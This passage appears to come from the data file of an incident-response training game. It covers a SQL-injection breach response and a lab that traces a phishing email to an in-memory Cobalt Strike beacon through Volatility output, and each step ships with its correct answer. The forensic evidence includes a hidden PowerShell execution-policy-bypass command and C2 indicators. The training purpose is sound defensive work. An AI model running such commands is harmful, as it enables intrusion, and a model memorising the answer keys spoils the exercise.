        hint: 'Multiply the number of paged requests by the page size and compare it with the table size.',
        walkthrough: '86 requests stepping LIMIT offsets by 500 cover 43,000 rows, effectively the entire 43,012-row table. Without the DB general log you rely on web logs (and response sizes) as evidence; state that assumption explicitly in the report. Customers were dumped in a single large response, so treat that table as fully exposed too.',
      },
      {
        stepNumber: 5,
        objective: 'Contain, eradicate, and recover',
        evidence: r`Constraints: shop revenue ~$40k/day; payment processor requires PFI investigation
Options under review:
 1) Patch products.php with prepared statements; deploy WAF virtual patch meanwhile
 2) Purge CVV storage; tokenize cards via processor
 3) Force customer password resets; rotate DB credentials and app secrets
 4) Check for web shells / persistence created via the same access
 5) Preserve logs and images for the PFI before changes`,
        question: 'Which sequence is best?',
        options: [
          'Fix the code first, then preserve evidence if there is time',
          'Only reset customer passwords',
          'Take the shop offline permanently',
          'Preserve evidence (5), apply a WAF virtual patch and deploy the code fix (1), hunt for persistence (4), rotate credentials and force resets (3), remove CVV storage and tokenize (2), then monitor and notify per legal guidance',
        ],
        correctIndex: 3,
        hint: 'Evidence first, then stop the bleeding, then remove anything the attacker left and fix data-handling practices.',
        walkthrough: 'Preserve evidence for the PFI and legal process before changing the system. Then block exploitation (virtual patch) and fix the code, check for any persistence obtained through the same weakness, rotate credentials and reset customer passwords, and remediate the PCI violation by eliminating CVV storage and tokenizing. Notification decisions follow counsel, the processor, and applicable law.',
      },
    ],
  },
  {
    id: 'lab-06',
    title: 'Phishing to Memory Forensics',
    domain: 1,
    difficulty: 'Hard',
    xpReward: 250,
    briefing: 'Accounts payable clerk a.patel (workstation AP-WS07, 10.20.6.17) opened an "Overdue Invoice" attachment and reported a brief black window. EDR shows no file-based detections. The IR lead had a memory image captured with WinPMEM before isolation. Use the email headers and Volatility 3 to reconstruct the attack.',
    steps: [
      {
        stepNumber: 1,
        objective: 'Analyze the phishing email',
        evidence: r`Return-Path: <billing@invoice-portal-secure.com>
From: "Accounts Receivable" <ar@corp-supplier.com>
Received: from mail.invoice-portal-secure.com (185.234.72.19)
Authentication-Results: mx.corp.com; spf=pass smtp.mailfrom=invoice-portal-secure.com;
   dkim=none; dmarc=fail (p=none) header.from=corp-supplier.com
Subject: Overdue Invoice #44821 - Final Notice
Attachment: Invoice_44821.html (smuggled ISO inside: Invoice_44821.iso -> Invoice.lnk)`,
        question: 'What do the authentication results tell you?',
        options: [
          'The email is legitimate because SPF passed',
          'SPF passed only for the attacker\'s own envelope domain; DMARC failed for the displayed From domain (corp-supplier.com), so the sender is spoofing the supplier',
          'DKIM proves the supplier sent it',
          'The email came from an internal server',
        ],
        correctIndex: 1,
        hint: 'Which domain did SPF check, and which domain does the user see in the From line?',
        walkthrough: 'SPF validates the envelope sender (invoice-portal-secure.com), which the attacker controls, so passing means little. DMARC checks alignment with the visible From domain and failed. The supplier\'s p=none policy let it through. The HTML smuggling → ISO → LNK chain is a common way to bypass Mark-of-the-Web and attachment filters.',
      },
      {
        stepNumber: 2,
        objective: 'Find the malicious process tree',
        evidence: r`$ vol -f AP-WS07.raw windows.pstree | sed -n '18,26p'
* 4012   explorer.exe        2026-03-14 08:01:10
** 6120  cmd.exe             2026-03-14 09:22:41
*** 6144 powershell.exe      2026-03-14 09:22:42
**** 6180 rundll32.exe       2026-03-14 09:22:47
** 2210  OUTLOOK.EXE         2026-03-14 08:02:30
$ vol -f AP-WS07.raw windows.cmdline --pid 6120 6144 6180
6120 cmd.exe /c powershell -w hidden -ep bypass -f E:\inv.ps1
6144 powershell -w hidden -ep bypass -f E:\inv.ps1
6180 rundll32.exe`,
        question: 'Which detail is the strongest indicator that rundll32 (PID 6180) is hosting injected code?',
        options: [
          'rundll32 is always malicious',
          'It was started after explorer.exe',
          'rundll32.exe was started with no DLL or export arguments, which has no legitimate purpose and is a common sacrificial process for injection',
          'It has a high PID',
        ],
        correctIndex: 2,
        hint: 'rundll32 normally needs a DLL path and an entry point. What does its command line show?',
        walkthrough: 'The LNK in the mounted ISO (drive E:) ran cmd → hidden PowerShell script → rundll32 with an empty command line. C2 frameworks frequently spawn rundll32 with no arguments as a sacrificial process and inject their payload into it. That makes PID 6180 the prime target for memory analysis.',
      },
      {
        stepNumber: 3,
        objective: 'Confirm code injection',
        evidence: r`$ vol -f AP-WS07.raw windows.malfind --pid 6180
PID   Process       Start VPN       End VPN         Tag   Protection              PrivateMemory
6180  rundll32.exe  0x2a1b0000      0x2a1effff      VadS  PAGE_EXECUTE_READWRITE  1
4d 5a 41 52 55 48 89 e5 48 81 ec 20 00 00 00 48   MZARUH..H.. ...H
$ vol -f AP-WS07.raw -o dump windows.malfind --pid 6180 --dump
$ yara -s rules/c2_frameworks.yar dump/pid.6180.vad.0x2a1b0000-0x2a1effff.dmp
CobaltStrike_Beacon_x64  dump/pid.6180.vad.0x2a1b0000-0x2a1effff.dmp
  0x4e21:$config: 00 01 00 01 00 02`,
        question: 'What has been established?',
        options: [
          'The region is a legitimate DLL mapped from disk',
          'The memory image is corrupted',
          'A private RWX region starting with a PE header (MZ followed by reflective-loader stub bytes) contains a beacon that matches a C2-framework YARA rule',
          'rundll32 is running a signed Microsoft module',
        ],
        correctIndex: 2,
        hint: 'Consider the protection, whether memory is private or file-backed, the first bytes, and the YARA match.',
        walkthrough: 'malfind flags executable private memory not backed by a file. "MZARUH" is the classic start of a reflectively loaded beacon (MZ header followed by loader stub instructions). Dumping the VAD and scanning it with YARA classifies the implant. Because it lives only in memory, this is why EDR saw no file detections and why acquiring memory before isolation and reboot mattered.',
      },
      {
        stepNumber: 4,
        objective: 'Extract network IOCs from memory',
        evidence: r`$ vol -f AP-WS07.raw windows.netscan | grep -E "6180|6144"
TCPv4  10.20.6.17:50211  185.234.72.19:443   ESTABLISHED  6180  rundll32.exe
TCPv4  10.20.6.17:50190  185.234.72.19:443   CLOSED       6144  powershell.exe
$ strings -el dump/pid.6180.vad.0x2a1b0000-0x2a1effff.dmp | grep -E "^/|Mozilla|\.com" | head -4
/jquery-3.3.1.min.js
Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko
cdn.invoice-portal-secure.com
/submit.php?id=`,
        question: 'Which conclusion about the C2 infrastructure is correct?',
        options: [
          'C2 is unrelated to the phishing infrastructure',
          'The beacon talks to 185.234.72.19 (the same IP that sent the email) over 443 using a jQuery-themed malleable profile; block the IP and domains and hunt for the URIs and UA fleet-wide',
          'The connection is to a Microsoft CDN, so it is benign',
          'PowerShell is the active C2 process',
        ],
        correctIndex: 1,
        hint: 'Compare the foreign address with the email\'s Received header from step 1.',
        walkthrough: 'The ESTABLISHED socket belongs to the injected rundll32, while PowerShell\'s connection (the stager download) is closed. The C2 IP matches the mail server in the email headers, linking delivery and C2. The URIs disguised as jQuery and the IE11 UA are typical of malleable C2 profiles and make good proxy/DNS hunt queries across the fleet.',
      },
      {
        stepNumber: 5,
        objective: 'Scope and respond',
        evidence: r`Proxy logs (last 72h) for cdn.invoice-portal-secure.com / 185.234.72.19:
  10.20.6.17  AP-WS07   (a.patel)      first seen 09:22:47
  10.20.6.22  AP-WS11   (m.okafor)     first seen 09:40:03
Email gateway: same campaign delivered to 14 mailboxes; 2 opened the attachment
AP-WS07 LSASS access by PID 6180: YES (EDR telemetry 09:31)`,
        question: 'What is the most complete response?',
        options: [
          'Reimage AP-WS07 only',
          'Send a phishing awareness email and close the ticket',
          'Isolate and image AP-WS11 as well, purge the campaign from all 14 mailboxes, block the IP/domains, reset credentials for a.patel and m.okafor (and any accounts cached on either host, since LSASS was accessed), rebuild both hosts, and tighten DMARC and ISO/LNK handling',
          'Block only the sender address',
        ],
        correctIndex: 2,
        hint: 'Proxy logs reveal a second victim, and LSASS access means credentials are in play.',
        walkthrough: 'Scope expanded to a second beaconing host, so contain it too. Purge the emails, block infrastructure, and treat credentials on both hosts as stolen because the beacon accessed LSASS. Rebuild from known-good images. Lessons learned: enforce DMARC alignment checks for lookalike senders, block ISO/IMG auto-mount or LNK execution from mounted images, and keep memory acquisition as a standard first step since this attack left nothing on disk for AV.',
      },
    ],
  },
];
